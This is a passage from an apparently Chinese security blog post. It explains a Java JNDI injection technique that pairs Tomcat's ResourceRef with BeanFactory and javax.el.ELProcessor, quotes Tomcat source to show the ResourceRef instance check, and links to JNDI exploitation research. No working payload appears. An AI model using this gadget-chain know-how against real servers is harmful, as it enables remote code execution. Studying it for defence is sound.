<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.naming.ResourceRef</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Represents a reference address to a resource.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Remy Maucherat</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceRef</span> <span class="keyword">extends</span> <span class="title">AbstractRef</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ResourceRef</span><span class="params">(String resourceClass, String description,</span></span></span><br><span class="line"><span class="params"><span class="function">                     String scope, String auth, <span class="keyword">boolean</span> singleton,</span></span></span><br><span class="line"><span class="params"><span class="function">                     String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里看到实际还是调用了父类方法</span></span><br><span class="line">    <span class="keyword">super</span>(resourceClass, factory, factoryLocation);</span><br><span class="line">    StringRefAddr refAddr = <span class="keyword">null</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractRef</span> <span class="keyword">extends</span> <span class="title">Reference</span></span></span><br></pre></td></tr></table></figure>

<p>所以最重要的是要创建的类<code>javax.el.ELProcessor</code> 和 工厂类 <code>org.apache.naming.factory.BeanFactory</code></p>
<p>为什么要用ResourceRef 这个类，因为在<code>org.apache.naming.factory.BeanFactory#getObjectInstance</code> 这个工厂创建类的方法中有限制，必须要是<code>ResourceRef</code>的实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a new Bean instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj The reference object describing the Bean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="params"><span class="function">                                Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">// 必须要是ResourceRef的实例</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Reference ref = (Reference) obj;</span><br><span class="line">            String beanClassName = ref.getClassName();</span><br><span class="line">            Class&lt;?&gt; beanClass = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>







<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
<p><a target="_blank" rel="noopener" href="https://81.68.118.217/index.php/archives/62/">https://81.68.118.217/index.php/archives/62/</a></p>
</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>